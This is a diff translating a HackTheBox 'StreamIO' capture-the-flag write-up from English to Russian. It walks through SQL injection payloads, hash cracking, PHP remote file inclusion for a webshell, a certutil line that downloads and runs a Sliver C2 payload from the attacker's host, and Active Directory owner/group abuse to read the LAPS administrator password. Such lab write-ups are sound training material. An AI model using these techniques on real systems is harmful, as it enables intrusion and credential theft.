@@ -9,9 +9,7 @@ permalink: /posts/2024-09-20-streamio-htb-writeup
 
 ## Intro
 
-FIXME
-
-Hi fellow hackers! In this HTB medium box, we are going to exploit SQL injection, PHP remote file inclusion and do a bunch of pivoting betweeen users with the help of bloodhound and some browser creds. I am going to be using sliver C2 to execute commands and manage beacons from different users.
+Привет, хакеры! В этой средней машине от HTB мы будем эксплуатировать SQL-инъекции, удаленное включение файлов PHP и горизонтально перемещаться между пользователями с помощью bloodhound и браузера firefox. Я буду использовать sliver C2 для выполнения команд и управления сессиями от разных пользователей.
 
 
 ## Enumeration 
@@ -75,116 +73,120 @@ Host script results:
 
 ```
 
-#### streamio.htb directory bruteforce
+#### перебор директорий streamio.htb
 ![951d3490cad0ffaf135add5f807e6b7d.png]({{ site.baseurl }}/images/951d3490cad0ffaf135add5f807e6b7d.png)
 
 ![677032fa520f5c178bafd632cea2c55f.png]({{ site.baseurl }}/images/677032fa520f5c178bafd632cea2c55f.png)
 
-*master.php seems interesting, but we can't do anything with it right now, so we'll leave it for later.*
+*master.php кажется интересным, но мы не можем ничего с ним сделать прямо сейчас, поэтому оставим его на потом.*
 ![a80bb040ecf94257ea30da5c897af455.png]({{ site.baseurl }}/images/a80bb040ecf94257ea30da5c897af455.png)
 
-#### watch.streamio.htb file bruteforce
+#### перебор директорий watch.streamio.htb
 ![89cf16b81422939a96ad2098cf841cbe.png]({{ site.baseurl }}/images/89cf16b81422939a96ad2098cf841cbe.png)
 
 ***
 
 ## SQLi
 
-Using directory bruteforcing we have found a file called [search.php](https://watch.streamio.htb/search.php) 
+Используя перебор каталогов, мы нашли файл с именем [search.php](https://watch.streamio.htb/search.php) 
 
-It contains a search bar that allows for searching films
+Он содержит строку поиска, которая позволяет искать фильмы
 
 ![d702f0dbcf3428e170d03bc5e9ba675c.png]({{ site.baseurl }}/images/d702f0dbcf3428e170d03bc5e9ba675c.png)
 
-We can see that `a' AND 1=1 --` and `a' AND 1=2 --` yield different results, this is and indicator that a SQLi vulnerability may exist.
+Мы видим, что `a' AND 1=1 --` и `a' AND 1=2 --` дают разные результаты, что свидетельствует о наличии уязвимости SQLi.
 
 ![c4465ebccbc01046b3e6054db88d10d3.png]({{ site.baseurl }}/images/c4465ebccbc01046b3e6054db88d10d3.png)
 
-We discover a union select sql injection 
+Мы обнаружили sql-инъекцию union select 
 
-**From here on all payloads are URL encocded**
+**Далее все полезные нагрузки закодированы в URL формат**
 
 ![91f40d1c2dccf0816da06054dd9eedec.png]({{ site.baseurl }}/images/91f40d1c2dccf0816da06054dd9eedec.png)
 
 ![c2a3935064dc76accc5cf8c823aea851.png]({{ site.baseurl }}/images/c2a3935064dc76accc5cf8c823aea851.png)
 
-### Extracting data from MSSQL
+### Вытаскиваем данные MSSQL
 
-Using the following payload we find the database's name that we are interacting with `10'+union+select+1,db_name(),2,3,4,5 --`  *STREAMIO*
+Используя следующую полезную нагрузку, мы находим имя базы данных, с которой взаимодействуем `10'+union+select+1,db_name(),2,3,4,5 --` *STREAMIO*.
 
-We can then have a look at what tables are availiable to us, maybe we can find some creds.
+После этого мы можем посмотреть, какие таблицы нам доступны, возможно, мы найдем креды пользователей.
 
 ![91106285856976352b502f0b839dab77.png]({{ site.baseurl }}/images/91106285856976352b502f0b839dab77.png)
 *` 10' union select 1,table_name,2,3,4,5 FROM information_schema.tables -- `*
 
 *[contents of information_schema.tables](https://www.mssqltips.com/sqlservertutorial/196/information-schema-tables/)*
 
-We are then able to select from the users table, however we do not know what columns it has. We can try to guess, but the [portswigger SQLi cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) has another useful command for us to run.
-
+Затем мы можем выбрать из таблицы пользователей, однако мы не знаем, какие столбцы она содержит. Мы можем попробовать угадывать, но в [portswigger SQLi cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) есть еще один полезный запрос, который мы можем использовать.
 `SELECT * FROM information_schema.columns WHERE table_name = 'users'`
-*However since we have a union select vulnerability we can't just plainly select, so we are going to use the same trick as we used in the previous query*
+
+*Но поскольку у нас уязвимость типа union select, мы не можем просто выбирать данные, поэтому мы используем тот же трюк, что и в предыдущем запросе*.
 
 ![287a1b81c60310670df037a1d501f186.png]({{ site.baseurl }}/images/287a1b81c60310670df037a1d501f186.png)
-We have now acquired the column names, now in order to extract them, we will have to use string concatenation. We can see that since the number 2 also prints with the query, *(Marked by green arrows)* then maybe we could use the second column. However when we try to replace "2" with a string the query fails to return, which means the second columns data type in the original query is not a string.
+Мы получили имена столбцов, теперь, чтобы извлечь данные, нам нужно использовать конкатенацию строк. Мы видим, что поскольку число 2 также печатается с запросом, *(Отмечено зелеными стрелками)*, то, возможно, мы могли бы использовать второй столбец. Однако когда мы пытаемся заменить «2» строкой, запрос не возвращается, а это значит, что тип данных второго столбца в исходном запросе не является строкой.
 
 ![fe275dcbc2b5e976537aeb75a005c567.png]({{ site.baseurl }}/images/fe275dcbc2b5e976537aeb75a005c567.png)
 
-*The syntax for string concatenation in the portswigger cheatsheet did not work for me, so I used the MSSQL concat function* `10'+union+select+1,CONCAT(username,+'%3a',+password),2,3,4,5+FROM+users+--`
+*Синтаксис объединения строк в шпаргалке portswigger мне не подошел, поэтому я использовал функцию MSSQL concat*.
+
+ `10'+union+select+1,CONCAT(username,+'%3a',+password),2,3,4,5+FROM+users+--`
 
 ![32231b5a929b7580a88191312c884169.png]({{ site.baseurl }}/images/32231b5a929b7580a88191312c884169.png)
 
-We got a bunch of passwords and hashes so I'm gonna download the response and grep them out
+В ответе приходит куча паролей и хэшей, поэтому я скачаю страницу и выведу их в формате grep
 
 ![7f4ee8ad8cb51848ab315a4bad542c09.png]({{ site.baseurl }}/images/7f4ee8ad8cb51848ab315a4bad542c09.png)
 
-We can tell that it looks lake md5 hashes, but if in doubt, use *hashid* from kali.
+Мы можем сказать, что это похожи на md5-хэши, но если вы сомневаетесь, используйте *hashid* из kali.
 
-Now we crack them using hashcat  `hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --username -o db_hashes_recovered.txt`
+Теперь брутим их с помощью hashcat 
+
+`hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --username -o db_hashes_recovered.txt`
 
 ![592aeee1a72f02cb12b5a9549af4f4ae.png]({{ site.baseurl }}/images/592aeee1a72f02cb12b5a9549af4f4ae.png)
 
-I then retrieved only the login and password using awk to test these credentials against `streamio.htb/login.php`
+Затем я убрал сам хэш и оставил только логины и пароли с помощью awk, чтобы проверить эти учетные данные на `streamio.htb/login.php`
 
 `awk -F ":" '{print $1 ":" $3}' user_pass.txt`
 
-We can use hydra to see if we can get a valid login 
+Мы можем использовать hydra, чтобы проверить, сможем ли мы за логиниться. 
 
 ![64d434c8ddd0c9504bc51f316909db44.png]({{ site.baseurl }}/images/64d434c8ddd0c9504bc51f316909db44.png)
 
 ***
 
-## Exploiting the admin panel
+## Эксплуатируем админ панель
 
-When we login to streamio.htb, we are now able to access the /admin endpoint previously unavailiable to us.
+После успешного логина на streamio.htb, мы получаем доступ к странице /admin, ранее недоступной для нас.
 
-Let's try bruteforcing directories
+Давайте попробуем перебрать каталоги.
 
-We can see that the url parameter seems to indicate pages, since it changes whenever we click on a different section.
+Мы видим, что параметр в url, похоже, указывает на страницы, поскольку он меняется всякий раз, когда мы нажимаем на другой раздел.
 
 ![78a8ea1dfb22cd16f09c268e2c3dbf3c.png]({{ site.baseurl }}/images/78a8ea1dfb22cd16f09c268e2c3dbf3c.png)
 
-We can try to fuzz this parameter to find other pages that are not listed 
+Мы можем по фаззить этот параметр чтобы найти другие страницы
 
 ![112166403e09e9efa18269f9e0b2f93c.png]({{ site.baseurl }}/images/112166403e09e9efa18269f9e0b2f93c.png)
 
-Something that we haven't seen is the page debug, let's have a look at that.
+То, что мы еще не видели, - это страница отладки *(debug)*, давайте посмотрим на это.
 
-If we pass in master.php that we found earlier in the enumeration phase, we can see a page that was previously unavailiable to us, since it could only be included. It seems to print the contents of all other tabs.
+Если мы передадим в параметр дебаг, значение master.php, страницу которую мы нашли ранее на этапе разведки, то увидим страницу, которая ранее была нам недоступна, поскольку ее можно было только инклюдить. Похоже, что она  содержит код для всех остальных вкладок.
 
 ![3d513b30a4ac2ad0511e673f5642dcbb.png]({{ site.baseurl }}/images/3d513b30a4ac2ad0511e673f5642dcbb.png)
 
-If we open the page as raw html, we can see an interesting form at the bottom, that is not displayed as a tab:
+Если открыть страницу в HTML виде мы можем найти интересную форму, которая не отображается как вкладка, она содержит параметр *'include'* :
 
 ![31a37e96866effbf048abf873c03f74f.png]({{ site.baseurl }}/images/31a37e96866effbf048abf873c03f74f.png)
 
-That means, if we make a post request to the same endpoint with the parameter include, we might be able to include arbitrary files, and if remote file inclusion is availiable, we may be able to include a PHP web shell.
+Это означает, что если мы сделаем post-запрос к странице debug с параметром include, мы сможем включить произвольные файлы, а если доступен удалённый инклюд файлов, мы сможем загрузить веб шелл PHP.
 
 ![0608b28006f586db588837cd5895125b.png]({{ site.baseurl }}/images/0608b28006f586db588837cd5895125b.png)
 ![829bbb9785f40eca1e0236d9a92a997d.png]({{ site.baseurl }}/images/829bbb9785f40eca1e0236d9a92a997d.png)
 
-Lo and behold, the server includes remote files. Let's pop a webshell shall we.
+О чудо, сервер инклюдит удалённые файлы, давайте организуем шелл.
 
-## RCE
+## Удалённое выполнение команд
 
 Webshell content:
 ```php
@@ -196,16 +198,16 @@ Webshell content:
 
 ```
 
-Since the shell is not really being uploaded, but included in the code, we will have to include the webshell with every command. 
+Так как мы не загружаем веб шелл, а только инклюдим, нам нужно будет это делать с каждым запросом. 
 
 ![e092817e578e7cae56283fb65f8c4794.png]({{ site.baseurl }}/images/e092817e578e7cae56283fb65f8c4794.png)
-*It works!*
+*Оно работает!*
 
-Now let's get a sliver beacon going, 
+Давайте запустим полезную нагрузку sliver, 
 
-#### *payload*
+#### *полезная нагрузка*
 
-*In actual red-team engagements, please do not ever just drop a bare sliver c2 shell on the system, you will get flagged by EDR or anything else for that matter immediately*
+*В реальном ред-тиминге, пожалуйста, никогда не загружайте не обфусцированный sliver c2 shell на систему, вы будете замечены EDR или чем-либо еще, немедленно.*
 
 ```cmd
 
@@ -217,25 +219,28 @@ certutil.exe -f -split -urlcache http://10.10.14.117/rs.exe && .\rs.exe
 
 ***
 
-## Discovering db_user && db_admin credentials 
-found at *C:\inetpub\streamio.htb\admin\index.php* in web source of the admin pages
+## Обнаружение учётных записей db_user и db_admin
+Найдены по адресу: **C:\inetpub\streamio.htb\admin\index.php** 
+в исходном коде страницы админ панели.
+
 ![5534b13189a2a56bcf7ed9b0d07340fa.png]({{ site.baseurl }}/images/5534b13189a2a56bcf7ed9b0d07340fa.png)
 
-*there are also creds for db_user, but he has less privileges, thus we won't use them*
+*Креды для db_user нам не интересны, у него меньше привилегий чем у администратора.*
 
-## Looking at the MSSQL db
+## Посмотрим на БД MSSQL
 
 ![f65d0320b6c921e75ca7a45105780f24.png]({{ site.baseurl }}/images/f65d0320b6c921e75ca7a45105780f24.png)
-If we run `netstat -ano` we can see a list of processes on ports, we have a port for MSSQL, so we are going to forward our local machines port to the vulnerable server, to have a look inside.
+Если мы запустим `netstat -ano`, то увидим список процессов на портах, мы видим порт для MSSQL, поэтому мы прокинем порт от нашей машины на хост который атакуем, чтобы заглянуть внутрь.
 
 ![5b42455c03d93cdc03030c0711ad5752.png]({{ site.baseurl }}/images/5b42455c03d93cdc03030c0711ad5752.png)
 
-I then found creds for user nikk37, that exists in the windows domain we are attacking
+В БД я нашёл хэш nikk37, пользователь с таким же именем существует и в домене который мы атакуем.
+
 ![91983bdab4dc80e03c39b0fce481c6c7.png]({{ site.baseurl }}/images/91983bdab4dc80e03c39b0fce481c6c7.png)
 
 ![4f82ed80b48bdff3614f31e0fb3e0519.png]({{ site.baseurl }}/images/4f82ed80b48bdff3614f31e0fb3e0519.png)
 
-Let's crack the hash using hashcat 
+Давайте сбрутим его с помощью hashcat
 
 ```
 hashcat -m 0 -a 0 nikk37.hash --username -o nikk37.recovered /usr/share/wordlists/rockyou.txt
@@ -245,14 +250,17 @@ hashcat -m 0 -a 0 nikk37.hash --username -o nikk37.recovered /usr/share/wordlist
 
 ***
 
-## Privilege escalation
+## Повышение привилегий
 
-As luck would have it, nikk37 has winrm availiable to him, and so we can login.
+Нам повезло, у nikk37 есть доступ через winrm.
+
 ![fbf78248592dcb2a4580a4535e4d2d50.png]({{ site.baseurl }}/images/fbf78248592dcb2a4580a4535e4d2d50.png)
 
-## Firefox saved credentials 
+## Сохранённые учётные данные в Firefox 
 
-When we run winPEAS, we get an interesting message that firefox credentials exist. We can download them and decrypt them locally, see if there's anything interesting in it.
+Когда мы запускаем winPEAS, то получаем интересное сообщение о том, что найдены сохранённые креды в firefox. Мы можем скачать их и расшифровать локально, посмотрим, есть ли в них что-нибудь интересное.
+
+Расшифровать данные из firefox можно с помощью утилиты [firefox_decrypt](https://github.com/unode/firefox_decrypt)
 
 ![77a5102d033c64218eb912b99baf2848.png]({{ site.baseurl }}/images/77a5102d033c64218eb912b99baf2848.png)
 
@@ -277,35 +285,35 @@ Password: 'password@12'
 
 ```
 
-We can use these passwords and spray them at different users to see if any of them get us into someone else's session
+Мы можем попробовать эти пароли для всех пользователей что нам знакомы, возможно что-то подойдёт.
 
-## Looking at the JDgodd user 
+## Смотрим на пользователя JDgodd 
 
-The passwords from before got us a password for 'JDgodd', unfortunately he does not have remote access, so we will have to use runas or powershell credentials to exploit his rights.
+Найденные данные позволили нам получить доступ к 'JDgodd', к сожалению, у него нет прав удаленного доступа, поэтому нам придется использовать runas или powershell, чтобы воспользоваться им.
 
 ![ad1f48f8009acff8600457889810ef04.png]({{ site.baseurl }}/images/ad1f48f8009acff8600457889810ef04.png)
-*You can find user's rights, groups e.t.c. through different ways but I just had a look in bloodhound data that I collected earlier*
 
-### Exploiting JDgodd to get Administrator
+*Вы можете найти права пользователя, группы и т.д. различными способами, но я просто заглянул в данные bloodhound, которые я собрал ранее*.
+
+### Путь от JDgodd к Administrator
 ![7da248e25ec4bac8509c68d1ca737b3f.png]({{ site.baseurl }}/images/7da248e25ec4bac8509c68d1ca737b3f.png)
 
-*Numbers on this list refer to same numbers on scheme*
-1. The write owner privilege means that JDgodd can change the owner of the group 'CORE STAFF', if we make the owner a user that we control, we can add users to that group.
-2. [ReadLAPSPassword](https://www.thehacker.recipes/ad/movement/dacl/readlapspassword) privilege that CORE STAFF group means that  you can read the LAPS password of the computer account (i.e. the password of the computer's local administrator).  
+*Номера в этом списке соответствуют тем же номерам на схеме*.
+1. Привилегия write owner означает, что JDgodd может изменить владельца группы 'CORE STAFF', если мы сделаем владельцем пользователя, которого мы контролируем, мы сможем добавлять пользователей в эту группу.
+2. Привилегия [ReadLAPSPassword](https://www.thehacker.recipes/ad/movement/dacl/readlapspassword) для группы CORE STAFF означает, что вы можете прочитать из LAPS пароль учетной записи компьютера (т.е. пароль локального администратора компьютера).
 
-#### Attack execution
+#### Выполняем атаку
 
-##### Add nikk37 to owners
-*I decided to use nikk37 because we have remoting over him, while if we used JDgodd, we would have to jump through hoops, changing owners is loud anyway, whichever user we choose*
+##### Делаем JDgodd владельцем группы 
 
-*Create credential object for JDgodd*
+*Создаём объект кредов для JDgodd*
 ```powershell
 $SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
 
 $Cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $SecPassword)
 ```
 
-*Add nikk37 to 'CORE STAFF'*
+*Добавляем nikk37 to 'CORE STAFF'*
 ```powershell
 #set the owner of CORE STAFF to be JDgodd
 Set-DomainObjectOwner -Identity 'CORE STAFF' -OwnerIdentity 'JDgodd' -Credential $Cred
@@ -319,14 +327,15 @@ Add-DomainGroupMember -Identity 'CORE STAFF' -Members 'nikk37' -Credential $Cred
 
 ![df467cd45de263f69c29f1088e2f2669.png]({{ site.baseurl }}/images/df467cd45de263f69c29f1088e2f2669.png)
 
-Once we have done this, *nikk37* can now read the local administrator account's password from LAPS. We can do that with netexec.
+После этого *nikk37* сможет прочитать пароль учетной записи локального администратора из LAPS. Мы можем сделать это с помощью netexec.
 
 ![393ba2e805d78518d662b4e1dbe362da.png]({{ site.baseurl }}/images/393ba2e805d78518d662b4e1dbe362da.png)
 
-We receive the Administrator password, and are able to login via winrm. 
+Мы получаем пароль Администратора и логинимся через winrm
 
 ![4f6013cca0cd1fb2bab74fded732904f.png]({{ site.baseurl }}/images/4f6013cca0cd1fb2bab74fded732904f.png)
 
-Pwned.
+Запавнено.
 
-Happy hacking to you my friends!
+Удачного взлома друзья!
+(Не используйте знания во вред, только там где вам разрешил владелец ресурса.)
